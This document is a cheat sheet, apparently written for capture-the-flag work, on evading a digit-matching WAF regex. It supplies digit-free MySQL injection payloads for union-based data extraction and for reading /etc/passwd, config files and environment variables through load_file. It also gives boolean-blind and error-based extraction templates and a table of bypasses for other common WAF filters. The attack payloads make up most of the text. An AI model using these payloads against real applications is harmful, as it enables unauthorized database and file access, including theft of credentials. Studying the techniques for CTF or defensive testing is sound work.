# WAF Bypass: Digit-Anchored Regex Filters

## Core Technique

When a WAF uses a regex like `/\d.+?\D.+/is` (blocks strings containing "digit → any chars → non-digit → more chars"), bypass by ensuring **the payload contains ZERO digit characters (0-9)**. Since `\d` requires a digit to match, a digit-free payload can never trigger the regex.

## PHP Regex Analysis: `/\d.+?\D.+/is`

| Component | Meaning |
|-----------|---------|
| `\d` | Any digit (0-9) |
| `.+?` | One or more any char (lazy) |
| `\D` | Any non-digit |
| `.+` | One or more any char (greedy) |
| `/s` | Dot matches newline |
| `/i` | Case-insensitive (irrelevant here) |

**Match condition**: String contains a digit, followed by at least 1 char, then a non-digit, then at least 1 more char. Minimum 4 characters.

**Key insight**: Pure-digit strings (`1234`) DON'T match because `\D` (non-digit) is never found. Strings with NO digits also don't match because `\d` is never found.

## MySQL Digit-Free Primitives

### Numbers via `length()`
```
length('a')      → 1
length('aa')     → 2
length('aaa')    → 3
length('a') + length('a')  → 2
length('aa') * length('aa') → 4
```

### String functions (all alphabetic)
```
version()        → MySQL version
database()       → current database name
user()           → current user
null             → NULL value
load_file()      → read server files
concat()         → concatenate strings
substr()         → substring
ascii()          → character ASCII value
char()           → ASCII to character
```

### Operators (non-digit)
```
+  -  *  /  =  <  >  !=  <>  and  or  not  like  in  between
```

### Comment markers (non-digit)
```
#     → MySQL line comment (NOT digit)
/* */ → MySQL block comment
```

## Payload Templates

### Information Extraction
```sql
'' union select version()#
'' union select database()#
'' union select user()#
'' union select table_name from information_schema.tables where table_schema=database()#
```

### File Disclosure (load_file)
```sql
'' union select load_file('/etc/passwd')#
'' union select load_file('/flag')#
'' union select load_file('/var/www/html/conf/config.php')#
'' union select load_file('/proc/self/environ')#
```

### Boolean Blind Injection (no digits)
```sql
'' and length(database())=length('a')#       -- db name length = 1?
'' and ascii(substr(database(),length('a'),length('a')))=ascii('a')#  -- first char = 'a'?
'' and ascii(substr(database(),length('aa'),length('a')))=ascii('b')# -- second char = 'b'?
```

**Character-by-character extraction pattern:**
1. Find db name length: compare `length(database())` with `length('aaa...')` (vary count)
2. Find each char: `ascii(substr(database(), <pos>, length('a')))` = `ascii('<guess>')`
3. Position uses `length('a')` for 1, `length('aa')` for 2, etc.

### Error-Based (if error output visible)
```sql
'' and updatexml(length('a'),concat(ascii('a'),database()),length('a'))#
'' and extractvalue(length('a'),concat(ascii('a'),database()))#
```

## Payload Construction Rules

1. **No digits anywhere** in the payload — not in keywords, not in values, not in comments
2. Use `#` for line comments (not `--` which may need trailing space)
3. Use `''` (empty string, two single quotes) for id=0 matching
4. Use `length('aaa...')` expressions for numeric values
5. Use `ascii()` / `char()` for character ↔ number conversions
6. URL-encode `#` as `%23` if needed for HTTP transmission

## Verification Script Pattern

```python
import re
pattern = re.compile(r'\d.+?\D.+', re.DOTALL)
payload = "'' union select load_file('/flag')#"
assert not pattern.search(payload), "Payload contains digits — will be blocked!"
```

## Other Regex Patterns & Bypasses

| WAF Regex | Bypass Strategy |
|-----------|----------------|
| `/\d.+?\D.+/is` | Zero-digit payloads |
| `/(union\|select)/i` | Case mixing, inline comments `/*!union*/`, whitespace `%0b` |
| `/\s/is` | Use `/**/` for spaces, `%0a`/`%0b`/`%0c` |
| `/['"]/` | Numeric context injection (no quotes needed) |
| `/\b(and\|or)\b/i` | `&&` for AND, `\|\|` for OR, XOR |

## Pitfalls

- MySQL treats `''` (empty string) as `0` in numeric context — useful for `WHERE id = ''`
- `#` comment must be OUTSIDE string literals (after closing `'`)
- `fetch_assoc()['text']` on empty result returns Fatal error — use as boolean oracle
- Payloads without `#` may cause the trailing `'` to be parsed as part of the SQL string
- `$_REQUEST` includes GET+POST+COOKIE — WAF checks all three
